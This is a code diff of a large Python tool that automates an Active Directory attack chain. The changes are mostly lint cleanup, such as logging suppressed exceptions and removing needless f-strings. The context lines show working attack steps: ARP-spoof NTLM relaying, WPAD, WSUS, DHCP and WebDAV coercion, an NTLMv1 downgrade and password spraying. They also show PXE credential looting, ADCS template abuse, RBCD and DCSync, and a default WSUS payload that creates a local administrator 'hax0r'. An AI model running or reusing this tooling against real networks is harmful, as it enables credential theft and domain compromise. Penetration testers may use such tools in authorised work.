@@ -50,7 +50,6 @@ import signal
 import subprocess
 import sys
 import textwrap
-import threading
 import time
 import zipfile
 from dataclasses import dataclass, field
@@ -264,14 +263,14 @@ class Config:
                 try:
                     proc.kill()
                 except Exception:
-                    pass
+                    log.debug("cleanup: suppressed non-fatal exception", exc_info=True)
             # Close tracked file handles
             try:
                 fh = getattr(proc, '_outfile', None)
                 if fh and fh != subprocess.DEVNULL:
                     fh.close()
             except Exception:
-                pass
+                log.debug("cleanup: suppressed non-fatal exception", exc_info=True)
         self.bg_processes.clear()
 
 
@@ -477,8 +476,8 @@ def run(cmd: list[str], cfg: Config, timeout: int = 300,
             # connections", binds :445, then dies in ~2s, so poll() reports a
             # false "exited immediately" and the ARP spoof is torn down before
             # any auth can be captured. DEVNULL does NOT fix this (that IS an
-            # immediate EOF); the write end must stay open. Validated on the
-            # Validated against a live on-prem L2 lab.
+            # immediate EOF); the write end must stay open. Validated against
+            # a live on-prem L2 lab.
             proc = subprocess.Popen(
                 cmd, stdout=f_out, stderr=subprocess.STDOUT,
                 stdin=subprocess.PIPE,
@@ -505,7 +504,10 @@ def run(cmd: list[str], cfg: Config, timeout: int = 300,
             cmd, capture_output=capture, text=True, timeout=timeout
         )
         if outfile:
-            outfile.write_text(result.stdout + (result.stderr or ""))
+            # Guard both streams with `or ""`: when capture=False, subprocess
+            # sets .stdout/.stderr to None, and `None + str` would raise
+            # TypeError instead of writing the file.
+            outfile.write_text((result.stdout or "") + (result.stderr or ""))
         # Stream output if not capturing
         if not capture and result.stdout:
             print(result.stdout, end="")
@@ -598,7 +600,7 @@ def _extra_tool_dirs() -> list[str]:
             import pwd
             homes.append(pwd.getpwnam(sudo_user).pw_dir)
         except (KeyError, ImportError):
-            pass
+            log.debug("_extra_tool_dirs: suppressed non-fatal exception", exc_info=True)
     homes.append(os.path.expanduser("~"))
     for h in homes:
         dirs.append(os.path.join(h, ".local", "bin"))
@@ -701,7 +703,7 @@ class AutoDiscovery:
                         self._set("iface", parts[idx], "default route")
                         return
         except Exception:
-            pass
+            log.debug("_detect_interface: suppressed non-fatal exception", exc_info=True)
         log.warning("Could not detect network interface")
 
     def _detect_attacker_ip(self):
@@ -717,7 +719,7 @@ class AutoDiscovery:
                 self._set("attacker_ip", m.group(1), f"interface {self.cfg.iface}")
                 return
         except Exception:
-            pass
+            log.debug("_detect_attacker_ip: suppressed non-fatal exception", exc_info=True)
         # Fallback: from interface
         if self.cfg.iface:
             try:
@@ -730,7 +732,7 @@ class AutoDiscovery:
                     self._set("attacker_ip", m.group(1), self.cfg.iface)
                     return
             except Exception:
-                pass
+                log.debug("_detect_attacker_ip: suppressed non-fatal exception", exc_info=True)
         log.error("Could not detect attacker IP — specify with -a")
 
     def _detect_gateway(self):
@@ -746,7 +748,7 @@ class AutoDiscovery:
                 self._set("gateway", m.group(1), "default route")
                 return
         except Exception:
-            pass
+            log.debug("_detect_gateway: suppressed non-fatal exception", exc_info=True)
         if self.cfg.dc_ip:
             self.cfg.gateway = self.cfg.dc_ip
             log.warning(f"Gateway: {self.cfg.dc_ip} (using DC IP as fallback)")
@@ -768,7 +770,7 @@ class AutoDiscovery:
                     self._set("target_net", net, self.cfg.iface)
                     return
             except Exception:
-                pass
+                log.debug("_detect_subnet: suppressed non-fatal exception", exc_info=True)
         log.error("Could not detect target subnet — specify with -t")
 
     def _detect_dc_via_scan(self):
@@ -799,7 +801,7 @@ class AutoDiscovery:
                 if wider not in ranges:
                     ranges.append(wider)
             except Exception:
-                pass
+                log.debug("_detect_dc_via_scan: suppressed non-fatal exception", exc_info=True)
 
         for net_str in ranges:
             try:
@@ -904,7 +906,7 @@ class AutoDiscovery:
                         self._set("domain", dom, "reverse DNS")
                         return
             except Exception:
-                pass
+                log.debug("_detect_domain: suppressed non-fatal exception", exc_info=True)
 
         # Method 3: LDAP rootDSE query against DC (zero-auth)
         if self.cfg.dc_ip:
@@ -921,7 +923,7 @@ class AutoDiscovery:
                     self._set("domain", dom, "LDAP rootDSE")
                     return
             except Exception:
-                pass
+                log.debug("_detect_domain: suppressed non-fatal exception", exc_info=True)
 
         # Method 4: SMB null session (nxc)
         if self.cfg.dc_ip and tool_exists("nxc"):
@@ -938,7 +940,7 @@ class AutoDiscovery:
                         self._set("domain", dom, "SMB null session")
                         return
             except Exception:
-                pass
+                log.debug("_detect_domain: suppressed non-fatal exception", exc_info=True)
 
         log.error("Could not detect domain — specify with -d")
 
@@ -1021,7 +1023,7 @@ class AutoDiscovery:
                     self._set("dc_fqdn", fqdn, "reverse DNS")
                     return
             except Exception:
-                pass
+                log.debug("_detect_dc_fqdn: suppressed non-fatal exception", exc_info=True)
         # nxc fingerprint
         if tool_exists("nxc"):
             try:
@@ -1034,7 +1036,7 @@ class AutoDiscovery:
                     self._set("dc_fqdn", f"{m.group(1)}.{domain}", "nxc SMB")
                     return
             except Exception:
-                pass
+                log.debug("_detect_dc_fqdn: suppressed non-fatal exception", exc_info=True)
         # Guess
         self.cfg.dc_fqdn = f"DC.{domain}"
         log.warning(f"DC FQDN: {self.cfg.dc_fqdn} (guessed — override with --dc-fqdn)")
@@ -1112,9 +1114,9 @@ def _check_impacket_ntlmrelayx_consistency() -> bool:
                   f"invocation will crash with TypeError.")
         log.error("Affected phases: arp, wpad, wsus, exploit. Fix:")
         detail(f"  $ sudo rm {actual_path}")
-        detail(f"  $ sudo apt --reinstall install impacket-scripts")
-        detail(f"  (apt-managed wrappers stay in sync with python3-impacket; "
-               f"pip-installed wrappers do not.)")
+        detail("  $ sudo apt --reinstall install impacket-scripts")
+        detail("  (apt-managed wrappers stay in sync with python3-impacket; "
+               "pip-installed wrappers do not.)")
         return False
     return True
 
@@ -1474,7 +1476,7 @@ def arp_spoof_relay(target: str, cfg: Config) -> bool:
                 try:
                     proc.kill()
                 except Exception:
-                    pass
+                    log.debug("arp_spoof_relay: suppressed non-fatal exception", exc_info=True)
         # Remove from global bg list
         for proc in bg_procs:
             if proc in cfg.bg_processes:
@@ -1483,7 +1485,7 @@ def arp_spoof_relay(target: str, cfg: Config) -> bool:
         try:
             Path("/proc/sys/net/ipv4/ip_forward").write_text(old_forward)
         except Exception:
-            pass
+            log.debug("arp_spoof_relay: suppressed non-fatal exception", exc_info=True)
 
 
 def extract_hashes(cfg: Config) -> list[str]:
@@ -1600,7 +1602,7 @@ def try_crack_hashes(cfg: Config) -> Optional[tuple[str, str, str]]:
     elif tool_exists("john"):
         log.info(f"⚙️  john the ripper with {wordlist.name}...")
         run(["john", "--format=netntlmv2", f"--wordlist={wordlist}", str(hashfile),
-             f"--max-run-time=90"],  # Hard cap: 90 seconds
+             "--max-run-time=90"],  # Hard cap: 90 seconds
             cfg, timeout=120)
         result = run(["john", "--show", "--format=netntlmv2", str(hashfile)], cfg)
         if result.stdout:
@@ -1835,7 +1837,7 @@ def enumerate_targets(cfg: Config) -> tuple[list[str], list[str]]:
                     deleg_hosts.append(parts[1])
 
     if deleg_hosts:
-        ok(f"Unconstrained delegation host(s) found:")
+        ok("Unconstrained delegation host(s) found:")
         (cfg.work_dir / "unconstrained-hosts.txt").write_text("\n".join(deleg_hosts) + "\n")
         for h in deleg_hosts:
             detail(h)
@@ -1858,7 +1860,7 @@ def enumerate_targets(cfg: Config) -> tuple[list[str], list[str]]:
                     ok(f"🎯 HIGH VALUE: {dh} ({ip}) — relay + unconstrained delegation")
                     high_value.append(ip)
             except Exception:
-                pass
+                log.debug("enumerate_targets: suppressed non-fatal exception", exc_info=True)
 
     if high_value:
         (cfg.work_dir / "high-value-targets.txt").write_text("\n".join(high_value) + "\n")
@@ -1968,7 +1970,7 @@ def exploit_target(target: str, cfg: Config) -> bool:
                 if rev:
                     target_fqdn = rev.splitlines()[0]
             except Exception:
-                pass
+                log.debug("exploit_target: suppressed non-fatal exception", exc_info=True)
         if run_kerberos_reflection(target_fqdn, cfg):
             (cfg.work_dir / f"working-method-{target}.txt").write_text("unicode-spn")
             return True
@@ -2192,7 +2194,7 @@ def dcsync_attack(already_exploited: str, cfg: Config):
             try:
                 relay_proc.kill()
             except Exception:
-                pass
+                log.debug("dcsync_attack: suppressed non-fatal exception", exc_info=True)
         if relay_proc in cfg.bg_processes:
             cfg.bg_processes.remove(relay_proc)
 
@@ -2415,7 +2417,7 @@ def _collect_ntlmv1_captures(cfg: Config, responder_out: Path) -> list[tuple[str
                     if logf.stat().st_mtime >= cfg.start_time:
                         text += "\n" + logf.read_text(errors="replace")
                 except Exception:
-                    pass
+                    log.debug("_collect_ntlmv1_captures: suppressed non-fatal exception", exc_info=True)
     return _parse_netntlmv1(text)
 
 
@@ -2545,7 +2547,7 @@ def _machine_hash_self_takeover(account: str, nthash: str, cfg: Config) -> bool:
         try:
             shutil.copy2(str(cfg.work_dir / m.group(1)), str(ccache))
         except Exception:
-            pass
+            log.debug("_machine_hash_self_takeover: suppressed non-fatal exception", exc_info=True)
         success_box(f"NetNTLMv1: local admin on {spn_host}!")
         detail(f"export KRB5CCNAME={ccache}")
         detail(f"impacket-psexec -k -no-pass {spn_host}")
@@ -2709,7 +2711,7 @@ def run_ntlmv1_downgrade(cfg: Config) -> bool:
             try:
                 resp_proc.kill()
             except Exception:
-                pass
+                log.debug("run_ntlmv1_downgrade: suppressed non-fatal exception", exc_info=True)
         if resp_proc in cfg.bg_processes:
             cfg.bg_processes.remove(resp_proc)
         if conf:
@@ -3054,7 +3056,7 @@ def run_reflect_loopback(cfg: Config) -> bool:
     forwarder on the foothold, and triggers coercion. The AP-REQ travels
     through the loopback forwarder; loopback-signing-enforcement off ⇒
     privileged SMB session opens locally."""
-    phase_header(f"CVE-2026-26128 LPE — Kerberos loopback reflection")
+    phase_header("CVE-2026-26128 LPE — Kerberos loopback reflection")
 
     target_fqdn = cfg.dc_fqdn if cfg.reflect_host == cfg.dc_ip else (cfg.reflect_host or cfg.dc_fqdn)
     if not target_fqdn:
@@ -3408,7 +3410,7 @@ def _password_spray(cfg: Config, users: list[str], password: str) -> bool:
     cmd = ["nxc", "smb", cfg.dc_ip, "-u", str(user_file), "-p", password,
            "-d", cfg.domain, "--continue-on-success"]
     log.info(f"🔍 Spraying '{password}' across {len(users)} user(s)")
-    result = run(cmd, cfg, timeout=600, outfile=out_file)
+    run(cmd, cfg, timeout=600, outfile=out_file)
     if not out_file.exists():
         return False
     for line in out_file.read_text().splitlines():
@@ -3448,7 +3450,7 @@ def _test_weak_credentials(cfg: Config, users: list[str]) -> bool:
         cmd = ["nxc", "smb", cfg.dc_ip, "-u", str(user_file), "-d", cfg.domain,
                "--continue-on-success"] + pw_args
         log.info(f"🔍 Weak-password check ({label}) across {len(users)} user(s)")
-        result = run(cmd, cfg, timeout=600, outfile=out_file)
+        run(cmd, cfg, timeout=600, outfile=out_file)
         if not out_file.exists():
             continue
         for line in out_file.read_text(errors="replace").splitlines():
@@ -3677,7 +3679,7 @@ def passive_sniff(cfg: Config, duration: int = 30) -> dict:
     # Run tcpdump for the full duration — timeout is the only limit
     # (no -c flag, so it captures all packets until timeout expires)
     log.info(f"Capturing for {duration}s on {iface}...")
-    result = run(
+    run(
         ["tcpdump", "-i", iface, "-n", "-l", bpf],
         cfg, timeout=duration, capture=True,
         outfile=capture_file
@@ -3866,7 +3868,7 @@ def passive_sniff(cfg: Config, duration: int = 30) -> dict:
         found_anything = True
 
     if results["domains"]:
-        ok(f"🏢 Domain name(s) detected in traffic:")
+        ok("🏢 Domain name(s) detected in traffic:")
         for dom in sorted(results["domains"]):
             detail(dom)
         found_anything = True
@@ -4072,7 +4074,7 @@ def run_wpad_attack(cfg: Config) -> bool:
                 try:
                     proc.kill()
                 except Exception:
-                    pass
+                    log.debug("run_wpad_attack: suppressed non-fatal exception", exc_info=True)
         for proc in bg_procs:
             if proc in cfg.bg_processes:
                 cfg.bg_processes.remove(proc)
@@ -4338,7 +4340,7 @@ def run_wsus_relay(cfg: Config) -> bool:
                 try:
                     proc.kill()
                 except Exception:
-                    pass
+                    log.debug("run_wsus_relay: suppressed non-fatal exception", exc_info=True)
         for proc in bg_procs:
             if proc in cfg.bg_processes:
                 cfg.bg_processes.remove(proc)
@@ -4353,7 +4355,7 @@ def run_wsus_relay(cfg: Config) -> bool:
         try:
             Path("/proc/sys/net/ipv4/ip_forward").write_text(old_forward)
         except Exception:
-            pass
+            log.debug("run_wsus_relay: suppressed non-fatal exception", exc_info=True)
 
 
 def run_wsus_inject(cfg: Config) -> bool:
@@ -4379,7 +4381,7 @@ def run_wsus_inject(cfg: Config) -> bool:
     if cfg.custom_cmd:
         payload_cmd = cfg.custom_cmd
     else:
-        payload_cmd = f"cmd.exe /c net user /add hax0r P@ssw0rd123! && net localgroup administrators hax0r /add"
+        payload_cmd = "cmd.exe /c net user /add hax0r P@ssw0rd123! && net localgroup administrators hax0r /add"
         log.warning(f"No --custom-cmd specified, using default: {payload_cmd}")
 
     # If AppLocker mode, wrap command for bypass
@@ -4562,7 +4564,7 @@ def run_pxe_attack(cfg: Config) -> bool:
     if pxethiefy_path:
         log.info("🖥️  Using pxethiefy to discover PXE servers via DHCP broadcast...")
         pxe_output = pxe_dir / "pxethiefy-explore.txt"
-        result = run(
+        run(
             pxethiefy_path.split() + ["explore", "-i", iface],
             cfg, timeout=90, outfile=pxe_output
         )
@@ -4587,7 +4589,7 @@ def run_pxe_attack(cfg: Config) -> bool:
                 pxe_hash = hashcat_match.group(1)
                 hashfile = pxe_dir / "pxe-hashcat.txt"
                 hashfile.write_text(pxe_hash + "\n")
-                ok(f"🔐 PXE media is password-protected — hashcat hash saved")
+                ok("🔐 PXE media is password-protected — hashcat hash saved")
                 detail(f"Hash: {pxe_hash[:60]}...")
                 detail(f"Crack: hashcat -m 28800 {hashfile} rockyou.txt")
 
@@ -4672,13 +4674,13 @@ def _manual_tftp_extract(pxe_server: str, pxe_dir: Path, cfg: Config) -> bool:
 
         log.info(f"  📥 TFTP GET: {remote_path}")
         if tftp_cmd == "atftp":
-            result = run(
+            run(
                 ["atftp", "--get", "--remote-file", remote_path,
                  "--local-file", str(local_path), pxe_server],
                 cfg, timeout=20
             )
         else:
-            result = run(
+            run(
                 ["tftp", pxe_server, "-c", "get", remote_path, str(local_path)],
                 cfg, timeout=20
             )
@@ -4799,7 +4801,7 @@ def _parse_bootstrap_ini(content: str, cfg: Config) -> bool:
         domain = domain_match.group(1) if domain_match else ""
         share = share_match.group(1) if share_match else ""
 
-        ok(f"🔑 PXE Bootstrap.ini credentials found!")
+        ok("🔑 PXE Bootstrap.ini credentials found!")
         detail(f"User: {domain}\\{user}")
         if password:
             detail(f"Password: {password}")
@@ -4809,7 +4811,7 @@ def _parse_bootstrap_ini(content: str, cfg: Config) -> bool:
         # Save to loot file
         loot = cfg.work_dir / "pxe-creds.txt"
         with open(loot, "a") as f:
-            f.write(f"[Bootstrap.ini]\n")
+            f.write("[Bootstrap.ini]\n")
             f.write(f"User: {domain}\\{user}\n")
             f.write(f"Password: {password}\n")
             f.write(f"Share: {share}\n\n")
@@ -4956,7 +4958,7 @@ def _try_crack_pxe_hash(hashfile: Path, cfg: Config) -> str:
 
     # hashcat mode 28800 = SCCM PXE media
     if tool_exists("hashcat"):
-        log.info(f"⚙️  Cracking PXE hash with hashcat (mode 28800)...")
+        log.info("⚙️  Cracking PXE hash with hashcat (mode 28800)...")
         run(
             ["hashcat", "-m", "28800", str(hashfile), str(wordlist),
              "--outfile", str(cracked_file), "--outfile-format=2", "--quiet"],
@@ -5379,7 +5381,6 @@ def _find_writable_shares(cfg: Config) -> list[tuple[str, str]]:
     # Format: SMB  10.0.0.1  445  DC01  ShareName  READ,WRITE  Comment
     for line in (result.stdout or "").splitlines():
         if "WRITE" in line.upper():
-            parts = line.split()
             # Find the IP (second field after SMB marker)
             ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
             if ip_match:
@@ -5489,7 +5490,7 @@ def run_ntlm_theft(cfg: Config) -> bool:
             )
             ntlmrelayx_running = check.returncode == 0
         except Exception:
-            pass
+            log.debug("run_ntlm_theft: suppressed non-fatal exception", exc_info=True)
 
         if ntlmrelayx_running:
             log.info("ntlmrelayx already running — relying on it for hash capture")
@@ -5548,7 +5549,7 @@ def run_ntlm_theft(cfg: Config) -> bool:
                 try:
                     proc.kill()
                 except Exception:
-                    pass
+                    log.debug("run_ntlm_theft: suppressed non-fatal exception", exc_info=True)
         for proc in bg_procs:
             if proc in cfg.bg_processes:
                 cfg.bg_processes.remove(proc)
@@ -5791,7 +5792,7 @@ def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
             finally:
                 # ALWAYS restore original template, even on exception.
                 # certipy wrote the .json into cfg.work_dir (we chdir'd).
-                log.info(f"  ESC4: Restoring original template configuration...")
+                log.info("  ESC4: Restoring original template configuration...")
                 old_config = cfg.work_dir / f"{template}.json"
                 if old_config.exists():
                     restore_cmd = (
@@ -5859,7 +5860,7 @@ def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
             result = run(retrieve_cmd, cfg, timeout=60)
 
         if pfx_path.exists():
-            ok(f"  ESC7: Certificate obtained via SubCA")
+            ok("  ESC7: Certificate obtained via SubCA")
             return str(pfx_path)
 
     else:
@@ -6004,7 +6005,7 @@ def _adcs_relay_esc8(ca_host: str, cfg: Config) -> Optional[str]:
                 try:
                     proc.kill()
                 except Exception:
-                    pass
+                    log.debug("_adcs_relay_esc8: suppressed non-fatal exception", exc_info=True)
         for proc in bg_procs:
             if proc in cfg.bg_processes:
                 cfg.bg_processes.remove(proc)
@@ -6361,8 +6362,8 @@ def run_webdav_coercion(target: str, cfg: Config) -> bool:
                     "-u", cfg.username, "-p", cfg.password, "-d", cfg.domain,
                     cfg.attacker_ip, target
                 ]
-            result = run(coerce_cmd, cfg, timeout=30,
-                        outfile=cfg.work_dir / "webdav-coerce.txt")
+            run(coerce_cmd, cfg, timeout=30,
+                outfile=cfg.work_dir / "webdav-coerce.txt")
         else:
             # Fallback: use coercer with HTTP filter
             if tool_exists("coercer"):
@@ -6373,8 +6374,8 @@ def run_webdav_coercion(target: str, cfg: Config) -> bool:
                 ]
                 if cfg.has_creds:
                     coerce_cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
-                result = run(coerce_cmd, cfg, timeout=60,
-                            outfile=cfg.work_dir / "webdav-coerce.txt")
+                run(coerce_cmd, cfg, timeout=60,
+                    outfile=cfg.work_dir / "webdav-coerce.txt")
             else:
                 log.error("No coercion tool found for WebDAV trigger")
                 return False
@@ -6408,7 +6409,7 @@ def run_webdav_coercion(target: str, cfg: Config) -> bool:
                 try:
                     proc.kill()
                 except Exception:
-                    pass
+                    log.debug("run_webdav_coercion: suppressed non-fatal exception", exc_info=True)
         for proc in bg_procs:
             if proc in cfg.bg_processes:
                 cfg.bg_processes.remove(proc)
@@ -6493,7 +6494,7 @@ def run_dhcp_coercion(cfg: Config) -> bool:
             return False
         bg_procs.append(relay_proc)
         if not wait_relay_ready(relay_proc):
-            log.error(f"ntlmrelayx exited immediately")
+            log.error("ntlmrelayx exited immediately")
             return False
 
         # Trigger coercion against the DHCP server
@@ -6518,8 +6519,8 @@ def run_dhcp_coercion(cfg: Config) -> bool:
                     cfg.attacker_ip, dhcp_server
                 ]
 
-        result = run(coerce_cmd, cfg, timeout=60,
-                    outfile=cfg.work_dir / "dhcp-coerce.txt")
+        run(coerce_cmd, cfg, timeout=60,
+            outfile=cfg.work_dir / "dhcp-coerce.txt")
 
         # Wait for relay
         time.sleep(15)
@@ -6543,7 +6544,7 @@ def run_dhcp_coercion(cfg: Config) -> bool:
                 try:
                     proc.kill()
                 except Exception:
-                    pass
+                    log.debug("run_dhcp_coercion: suppressed non-fatal exception", exc_info=True)
         for proc in bg_procs:
             if proc in cfg.bg_processes:
                 cfg.bg_processes.remove(proc)
@@ -7038,7 +7039,7 @@ def _set_rbcd(target: str, machine_name: str, cfg: Config) -> bool:
         ]
         result = run(cmd, cfg, timeout=60)
         if result.returncode == 0:
-            ok(f"RBCD delegation set via impacket")
+            ok("RBCD delegation set via impacket")
             return True
 
     log.error("Failed to set RBCD delegation (need bloodyAD or impacket-rbcd)")
@@ -7392,7 +7393,7 @@ def run_dollar_ticket(cfg: Config) -> bool:
     prev_cwd = os.getcwd()
     try:
         os.chdir(cfg.work_dir)
-        result = run(cmd, cfg, timeout=60, outfile=out_file)
+        run(cmd, cfg, timeout=60, outfile=out_file)
     finally:
         os.chdir(prev_cwd)
 
@@ -8258,7 +8259,7 @@ def consume_nxc_findings(cfg: Config):
             summary_lines.append(f"MAQ-RBCD-VIABLE: MachineAccountQuota = {maq}")
             detail(f"MAQ={maq} — RBCD machine-account creation viable")
         else:
-            summary_lines.append(f"MachineAccountQuota = 0 (RBCD path closed)")
+            summary_lines.append("MachineAccountQuota = 0 (RBCD path closed)")
 
     # --- nopac (CVE-2021-42278/42287)
     if "VULNERABLE" in _read("nopac").upper() or "NOPAC IS VULNERABLE" in _read("nopac").upper():
@@ -9448,7 +9449,7 @@ def run_full_auto(cfg: Config):
         return
 
     separator()
-    ok(f"🔑 Switching to authenticated attack chain")
+    ok("🔑 Switching to authenticated attack chain")
     ok(f"Credentials: {cfg.domain}\\{cfg.username}")
     print()
 
@@ -9568,7 +9569,7 @@ def print_summary(cfg: Config):
     mins, secs = divmod(elapsed, 60)
 
     print(f"\n{C.BOLD_CYAN}╔══════════════════════════════════════════════════════╗")
-    print(f"║           📊 ATTACK CHAIN SUMMARY                   ║")
+    print("║           📊 ATTACK CHAIN SUMMARY                   ║")
     print(f"╠══════════════════════════════════════════════════════╣{C.NC}")
 
     rows = [
